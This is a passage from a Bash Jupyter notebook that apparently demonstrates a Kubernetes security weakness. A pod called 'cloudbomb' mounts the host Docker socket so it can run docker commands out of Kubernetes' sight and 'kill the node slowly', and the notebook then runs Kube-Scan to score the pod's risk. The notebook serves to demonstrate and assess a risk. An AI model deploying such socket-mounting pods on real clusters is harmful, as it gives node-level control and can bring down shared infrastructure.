      "7b297c602e69        0369cf4303ff                  \"etcd --advertise-cl…\"   5 hours ago         Up 5 hours                              k8s_etcd_etcd-minikube_kube-system_c31fe6a5afdd142cf3450ac972274b36_1\n",
      "e8cad49baae8        a27166429d98                  \"kube-controller-man…\"   5 hours ago         Up 5 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_57b8c22dbe6410e4bd36cf14b0f8bdc7_1\n",
      "3cc1b2a464b2        a8c2fdb8bf76                  \"kube-apiserver --ad…\"   5 hours ago         Up 5 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_c767dbeb9ddd2d01964c2fc02c621c4e_1\n",
      "436149371cdc        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_kube-scheduler-minikube_kube-system_6b4a0ee8b3d15a1c2e47c15d32e6eb0d_1\n",
      "9d4795779b94        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_57b8c22dbe6410e4bd36cf14b0f8bdc7_1\n",
      "62f795b1ec54        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_kube-apiserver-minikube_kube-system_c767dbeb9ddd2d01964c2fc02c621c4e_1\n",
      "8beeb5fea3f8        k8s.gcr.io/pause:3.2          \"/pause\"                 5 hours ago         Up 5 hours                              k8s_POD_etcd-minikube_kube-system_c31fe6a5afdd142cf3450ac972274b36_1\n"
     ]
    }
   ],
   "source": [
    "kubectl logs cloudbomb"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Docker is 💩, let us use `cri-o`\n",
    "\n",
    "Doesn' solve the principle problem"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Docker vs Kubernetes\n",
    "\n",
    "The docker command bypasses Kubernetes. It is *not* visible to the `kubelet` and the `api-server`\n",
    "\n",
    "It will kill the node _s l o w l y_"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "docker ps | grep -E '$|.*BOOM.*$'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Kube-Scan\n",
    "\n",
    "Examine the pod with [Octarine Kube-Scan](https://github.com/octarinesec/kube-scan)\n",
    "\n",
    "Open a separate terminal window and run `minikube tunnel` in this terminal"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "namespace/kube-scan created\n",
      "configmap/kube-scan created\n",
      "serviceaccount/kube-scan created\n",
      "clusterrole.rbac.authorization.k8s.io/kube-scan created\n",
      "clusterrolebinding.rbac.authorization.k8s.io/kube-scan created\n",
      "deployment.apps/kube-scan created\n",
      "service/kube-scan-ui created\n"
     ]
    }
   ],
   "source": [
    "kubectl apply -f https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan.yaml"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "deployment.apps/kube-scan condition met\n"
     ]
    }
   ],
   "source": [
    "kubectl wait -n kube-scan --for=condition=available deployment/kube-scan"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "namespace/kube-scan unchanged\n",
      "configmap/kube-scan unchanged\n",
      "serviceaccount/kube-scan unchanged\n",
      "\u001b[33;1mWarning:\u001b[0m rbac.authorization.k8s.io/v1beta1 ClusterRole is deprecated in v1.17+, unavailable in v1.22+; use rbac.authorization.k8s.io/v1 ClusterRole\n",
      "clusterrole.rbac.authorization.k8s.io/kube-scan configured\n",
      "\u001b[33;1mWarning:\u001b[0m rbac.authorization.k8s.io/v1beta1 ClusterRoleBinding is deprecated in v1.17+, unavailable in v1.22+; use rbac.authorization.k8s.io/v1 ClusterRoleBinding\n",
      "clusterrolebinding.rbac.authorization.k8s.io/kube-scan configured\n",
      "deployment.apps/kube-scan unchanged\n",
      "service/kube-scan-ui configured\n"
     ]
    }
   ],
   "source": [
    "kubectl apply -f https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan-lb.yaml"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http://10.96.201.143\n"
     ]
    }
   ],
   "source": [
    "echo http://$(kubectl -n kube-scan get service kube-scan-ui -o jsonpath={..ip})"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Risk Score\n",
    "\n",
    "Current 5, should be 8-9 \n",
    "\n",
    "I own the node, no network access"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Cleanup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "kubectl delete pod cloudbomb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "kubectl delete -f https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan.yaml -f https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan-lb.yaml"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Pedestrians approach"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "apiVersion: v1\n",
      "kind: Pod\n",
      "metadata:\n",
      "  creationTimestamp: \"2021-04-28T14:08:41Z\"\n",
      "  name: cloudbomb\n",
      "  namespace: default\n",
      "  resourceVersion: \"30894\"\n",
      "  uid: 946f8797-7aff-420e-bd18-6d423f0355f2\n",
      "spec:\n",
      "  containers:\n",
      "  - command:\n",
      "    - /bin/sh\n",
      "    - -c\n",
      "    - while true;            do   docker ps ;              sleep 10 ;            done\n",
      "    image: cloudbomb\n",
      "    imagePullPolicy: IfNotPresent\n",
      "    name: cloudbomb\n",
      "    resources: {}\n",
      "    terminationMessagePath: /dev/termination-log\n",
      "    terminationMessagePolicy: File\n",
      "    volumeMounts:\n",
      "    - mountPath: /var/run/docker.sock\n",
      "      name: docker-socket\n",
      "  dnsPolicy: ClusterFirst\n",
      "  enableServiceLinks: true\n",
      "  nodeName: minikube\n",
      "  preemptionPolicy: PreemptLowerPriority\n",
      "  priority: 0\n",
      "  restartPolicy: Always\n",
      "  schedulerName: default-scheduler\n",
      "  securityContext: {}\n",
      "  serviceAccount: default\n",
      "  serviceAccountName: default\n",
      "  terminationGracePeriodSeconds: 30\n",
      "  tolerations:\n",
      "  - effect: NoExecute\n",
      "    key: node.kubernetes.io/not-ready\n",
      "    operator: Exists\n",
      "    tolerationSeconds: 300\n",
      "  - effect: NoExecute\n",
      "    key: node.kubernetes.io/unreachable\n",
      "    operator: Exists\n",
      "    tolerationSeconds: 300\n",
      "  volumes:\n",
      "  - hostPath:\n",
      "      path: /var/run/docker.sock\n",
      "      type: Socket\n",
      "    name: docker-socket\n",
      "status:\n",
      "  conditions:\n",
      "  - lastProbeTime: null\n",
      "    lastTransitionTime: \"2021-04-28T14:08:41Z\"\n",
      "    status: \"True\"\n",
      "    type: Initialized\n",
      "  - lastProbeTime: null\n",
      "    lastTransitionTime: \"2021-04-28T14:08:42Z\"\n",
      "    status: \"True\"\n",
      "    type: Ready\n",
      "  - lastProbeTime: null\n",
      "    lastTransitionTime: \"2021-04-28T14:08:42Z\"\n",
      "    status: \"True\"\n",
      "    type: ContainersReady\n",
      "  - lastProbeTime: null\n",
      "    lastTransitionTime: \"2021-04-28T14:08:41Z\"\n",
      "    status: \"True\"\n",
      "    type: PodScheduled\n",
      "  containerStatuses:\n",
      "  - containerID: docker://fdd5d0665eff019d3584c82024206c6984ace6415d04aadfdedc9cee77636a0b\n",
      "    image: cloudbomb:latest\n",
      "    imageID: docker://sha256:7392e6e1931efe617cf94c677f8a31a691dd131262e9c19678b96ca71134d17a\n",
      "    lastState: {}\n",
      "    name: cloudbomb\n",
      "    ready: true\n",
      "    restartCount: 0\n",
      "    started: true\n",
      "    state:\n",
      "      running:\n",
      "        startedAt: \"2021-04-28T14:08:42Z\"\n",
      "  hostIP: 192.168.49.2\n",
      "  phase: Running\n",
      "  podIP: 172.17.0.9\n",
      "  podIPs:\n",
      "  - ip: 172.17.0.9\n",
      "  qosClass: BestEffort\n",
      "  startTime: \"2021-04-28T14:08:41Z\"\n"
     ]
    }
   ],
   "source": [
    "kubectl get pods cloudbomb -o yaml"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Bash",
   "language": "bash",
   "name": "bash"
  },
  "language_info": {
   "codemirror_mode": "shell",
   "file_extension": ".sh",
   "mimetype": "text/x-sh",
   "name": "bash"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
